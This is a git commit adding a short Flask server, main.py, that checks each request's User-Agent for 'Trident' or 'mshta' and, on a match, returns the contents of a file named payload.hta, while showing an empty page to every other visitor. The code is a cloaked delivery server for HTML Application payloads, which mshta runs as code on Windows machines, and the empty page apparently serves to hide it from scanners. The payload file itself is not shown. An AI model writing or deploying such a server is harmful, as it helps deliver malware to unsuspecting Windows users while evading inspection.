dfbc15ffda4e7badc9878de8c75f96ffc3595d65
xd <thegoatedvalemommy@outlook.com>
2026-07-07 07:08:01 +0200

    Add files via upload

---
+++ main.py
@@ -0,0 +1,19 @@
+import os
+from flask import Flask, request
+
+app = Flask(__name__)
+PORT = int(os.environ.get("PORT", 8000))
+
+@app.route('/')
+def handle_request():
+    user_agent = request.headers.get('User-Agent', '')
+    
+    if "Trident" in user_agent or "mshta" in user_agent.lower():
+        # Open and read the separate HTA file directly
+        with open("payload.hta", "r") as f:
+            return f.read()
+    else:
+        return "<html><head></head><body></body></html>"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=PORT)
